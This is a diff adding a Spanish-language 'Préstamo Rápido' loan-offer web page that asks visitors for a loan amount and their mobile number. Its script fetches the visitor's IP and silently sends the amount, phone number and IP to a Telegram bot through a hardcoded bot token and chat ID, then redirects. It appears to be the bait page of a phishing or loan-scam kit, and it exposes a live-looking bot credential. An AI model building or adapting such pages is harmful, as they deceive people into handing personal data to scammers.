@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Préstamo Rápido</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/noUiSlider/14.6.3/nouislider.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/noUiSlider/14.6.3/nouislider.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .container {
+            border-radius: 8px;
+            padding: 20px;
+            max-width: 390px;
+            text-align: center;
+        }
+
+        .title {
+            font-size: 1.5em;
+            margin-bottom: 10px;
+        }
+
+        #loan-slider {
+            margin: 40px 0;
+        }
+
+        .slider-container {
+            position: relative;
+            margin-bottom: 40px;
+        }
+
+        .slider-value {
+            position: absolute;
+            top: -45px;
+            padding: 5px;
+            border-radius: 3px;
+            font-weight: bold;
+            color: #000;
+            transform: translateX(-50%);
+            white-space: nowrap;
+        }
+
+        .input-group {
+            position: relative;
+            margin-top: 20px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            padding-left: 35px;
+            box-sizing: border-box;
+            border-radius: 5px;
+            border: 1px solid #ced4da;
+            outline: none;
+        }
+
+        .input-group .fa-mobile-alt {
+            position: absolute;
+            left: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #0066b3;
+            border: none;
+            color: white;
+            font-size: 1em;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+
+        .submit-btn:hover {
+            background-color: #014c85;
+        }
+
+        /* Estilos para el manejador del slider */
+        .noUi-handle {
+            border: none;
+            border-radius: 50%;
+            background: white;
+            width: 25px;
+            height: 24px;
+            cursor: pointer;
+            box-shadow: 0 4px 9px rgba(14, 14, 14, 0.18);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Estilos para la barra llena del slider */
+        .noUi-connect {
+            background: #0066b3; /* Color de la barra llena */
+        }
+
+        .arriba {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: auto;
+            padding: 3px;
+            border-bottom: 0.60rem solid #ffcb05;
+            background-color: rgb(8, 82, 141);
+            z-index: 999;
+        }
+
+    </style>
+</head>
+<body>
+    <center>
+        <div class="arriba">
+            <img src="lgg.png" style="width: 150px;margin-left: -10px;" alt="">
+        </div>
+
+        <div>
+            <img style="width: 150px;margin-top: 50px;" src="titulo.png" alt="">
+        </div>
+    </center>
+
+    <div class="container">
+        <br><br><br>
+        <h4 class="title">¡Respuesta en <strong>30</strong> segundos!</h4>
+        <br><br>
+        <!-- Slider de Préstamo -->
+        <div class="slider-container">
+            <div id="loan-slider"></div>
+            <div class="slider-value" id="slider-value">$ 5000</div>
+        </div>
+
+        <!-- Input para el celular -->
+        <div class="input-group">
+            <i class="fa fa-mobile-alt"></i>
+            <input required type="text" inputmode="numeric" id="celular" placeholder="Ingresá tu celular">
+        </div>
+
+        <!-- Botón para solicitar el préstamo -->
+        <button id="solicitar-prestamo" class="submit-btn">¡Solicitá tu préstamo ya!</button>
+
+        <br><br><br><br><br><br><br><br>
+        <img width="200px" src="image.png" alt="">
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            // Selecciona la barra del préstamo
+            const slider = document.getElementById('loan-slider');
+            const sliderValue = document.getElementById('slider-value');
+
+            // Inicializa noUiSlider en la barra del préstamo
+            noUiSlider.create(slider, {
+                start: 5000,
+                connect: 'lower',
+                range: {
+                    'min': 5000,
+                    'max': 200000
+                },
+                step: 500
+            });
+
+            // Actualiza el tooltip con el valor actual del slider y ajusta su posición
+            slider.noUiSlider.on('update', function (values, handle) {
+                const value = parseInt(values[handle]).toLocaleString();
+                sliderValue.innerHTML = `$ ${value}`;
+
+                // Obtiene la posición del control (handle) para mover el tooltip
+                const sliderRect = slider.getBoundingClientRect();
+                const handleElement = slider.querySelector('.noUi-handle');
+                const handleRect = handleElement.getBoundingClientRect();
+
+                // Calcula la posición del valor sobre el control del deslizador
+                const handlePosition = handleRect.left - sliderRect.left + (handleElement.offsetWidth / 2);
+                sliderValue.style.left = `${handlePosition}px`;
+            });
+
+            // Agregar evento al botón para enviar los datos a Telegram
+            const submitButton = document.getElementById('solicitar-prestamo');
+            submitButton.addEventListener('click', function () {
+                const celularInput = document.getElementById('celular');
+                const celular = celularInput.value.trim();
+                const cantidadPrestamo = slider.noUiSlider.get();
+
+                // Validar si el celular fue ingresado
+                if (celular === "") {
+                    alert("Por favor, ingrese su número de celular.");
+                    return;
+                }
+
+                // Obtener la IP del cliente
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        const ipCliente = data.ip;
+
+                        // Token y chat ID del bot de Telegram
+                        const token = "6808586807:AAH5KvJxwCHbxVecJJ1D2fQyiVCK4u_RuBQ"; // Reemplaza con tu token
+                        const chat_id = "5157616506"; // Reemplaza con tu chat ID
+
+                        // Mensaje a enviar a Telegram
+                        const mensaje = `Solicitud de Préstamo:\nCantidad solicitada: $ ${parseInt(cantidadPrestamo).toLocaleString()}\nCelular: ${celular}\nIP del Cliente: ${ipCliente}`;
+
+                        // URL para enviar el mensaje usando la API de Telegram
+                        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+                        // Envía la solicitud a Telegram usando método POST
+                        fetch(url, {
+                            method: "POST",
+                            headers: {
+                                "Content-Type": "application/json",
+                            },
+                            body: JSON.stringify({
+                                chat_id: chat_id,
+                                text: mensaje,
+                            }),
+                        })
+                        .then(response => {
+                            if (response.ok) {
+                                // Redirigir al usuario después de enviar la solicitud
+                                window.location.href = "index.html"; // Cambia esta URL por la URL deseada
+                            } else {
+                                alert("Hubo un problema al enviar la solicitud. Inténtalo nuevamente.");
+                            }
+                        })
+                        .catch(error => {
+                            console.error("Error al enviar los datos a Telegram:", error);
+                            alert("Hubo un problema al enviar la solicitud. Inténtalo nuevamente.");
+                        });
+                    })
+                    .catch(error => {
+                        console.error("Error al obtener la IP del cliente:", error);
+                        alert("Hubo un problema al obtener la IP. Inténtalo nuevamente.");
+                    });
+            });
+        });
+    </script>
+
+    <br><br><br>
+</body>
+</html>
